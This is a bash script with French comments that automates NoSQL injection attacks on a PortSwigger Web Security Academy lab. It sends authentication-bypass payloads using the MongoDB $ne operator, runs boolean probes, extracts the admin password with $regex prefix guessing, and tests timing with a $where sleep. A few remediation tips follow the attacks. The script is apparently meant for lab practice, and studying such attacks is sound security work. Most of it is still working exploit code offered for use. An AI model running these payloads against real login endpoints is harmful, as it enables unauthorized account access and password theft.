#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
LOGIN_PATH="/login"
COOKIE="session=<your-session-cookie>"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Détection basique d’injection NoSQL (GET)
test_nosql_get() {
    print_sep
    echo "[1] Test NoSQL injection via GET (caractères spéciaux, fuzzing)"
    FUZZ=("'" '"' "{" "}" "[" "]" "\$ne" "\$gt" "\$regex" "admin")
    for f in "${FUZZ[@]}"; do
        url="$TARGET_URL/?search=$f"
        resp=$(curl -sk "$url")
        if [[ $(echo "$resp" | wc -c) -gt 100 ]]; then
            echo "  [Test $f] Réponse longueur: $(echo "$resp" | wc -c)"
        fi
    done
    echo "  [Contrôle] : Cherchez une différence de comportement (erreur, résultat inattendu, etc.)."
}

# 2. Test booléen (login bypass, enumeration)
test_nosql_login_bypass() {
    print_sep
    echo "[2] Test NoSQL injection sur login (bypass booléen)"
    # Injection basique pour MongoDB : {"username": {"$ne": null}, "password": {"$ne": null}}
    resp=$(curl -sk -X POST -H "Content-Type: application/json" \
        -d '{"username": {"$ne": null}, "password": {"$ne": null}}' \
        "$TARGET_URL$LOGIN_PATH")
    if echo "$resp" | grep -Eqi "welcome|admin|user|success|flag"; then
        echo "  [+] Bypass réussi : accès sans mot de passe !"
        echo "$resp" | head -n 10
    else
        echo "  [-] Pas de bypass détecté."
    fi
}

# 3. Test conditionnel (true/false)
test_nosql_conditional() {
    print_sep
    echo "[3] Test NoSQL injection conditionnelle (true/false)"
    # True condition
    resp_true=$(curl -sk -X POST -H "Content-Type: application/json" \
        -d '{"username": "admin", "password": {"$ne": null}}' \
        "$TARGET_URL$LOGIN_PATH")
    # False condition
    resp_false=$(curl -sk -X POST -H "Content-Type: application/json" \
        -d '{"username": "admin", "password": {"$eq": "wrong"}}' \
        "$TARGET_URL$LOGIN_PATH")
    echo "  [True] Longueur: $(echo "$resp_true" | wc -c)"
    echo "  [False] Longueur: $(echo "$resp_false" | wc -c)"
    if [[ $(echo "$resp_true" | wc -c) -gt $(echo "$resp_false" | wc -c) ]]; then
        echo "  [+] Injection conditionnelle possible (différence de comportement)."
    else
        echo "  [-] Pas de différence marquante."
    fi
}

# 4. Test injection regex (extraction de données)
test_nosql_regex() {
    print_sep
    echo "[4] Test NoSQL injection par regex"
    # Exemple : trouver un utilisateur dont le mot de passe commence par 'a'
    resp=$(curl -sk -X POST -H "Content-Type: application/json" \
        -d '{"username": "admin", "password": {"$regex": "^a"}}' \
        "$TARGET_URL$LOGIN_PATH")
    if echo "$resp" | grep -Eqi "welcome|admin|user|success|flag"; then
        echo "  [+] Mot de passe admin commence par 'a' !"
    else
        echo "  [-] Pas de match pour ^a."
    fi
}

# 5. Test injection temporelle (timing)
test_nosql_timing() {
    print_sep
    echo "[5] Test NoSQL injection temporelle (timing attack)"
    # Payload pour MongoDB $where (si supporté)
    start=$(date +%s)
    curl -sk -X POST -H "Content-Type: application/json" \
        -d '{"username": "admin", "password": {"$where": "sleep(5000)"}}' \
        "$TARGET_URL$LOGIN_PATH" > /dev/null
    end=$(date +%s)
    dt=$((end - start))
    echo "  [Timing] Délai mesuré : $dt secondes"
    if [[ $dt -ge 5 ]]; then
        echo "  [+] Injection temporelle réussie (retard détecté) !"
    else
        echo "  [-] Pas de retard significatif."
    fi
}

# 6. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Utilisez des ORM/ODM sécurisés, validez et escapez toutes les entrées utilisateur."
    echo "- N'acceptez jamais d'opérateurs NoSQL ($ne, $gt, $where, $regex, etc.) dans les entrées utilisateur."
    echo "- Pour les labs PortSwigger, exploitez la différence de comportement ou le timing pour obtenir un accès ou un flag."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/nosql-injection"
}

# 7. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Détection et test d’injection NoSQL (GET, POST, JSON)."
    echo "2. Tests booléens, conditionnels, regex, et timing."
    echo "3. Contrôle automatisé de la réponse (succès, flag, différence de comportement)."
    echo "4. Application des recommandations de sécurité."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger NoSQL Injection : analyse, attaque et contrôle ==="
test_nosql_get
test_nosql_login_bypass
test_nosql_conditional
test_nosql_regex
test_nosql_timing
print_remediation
print_summary

# End of script
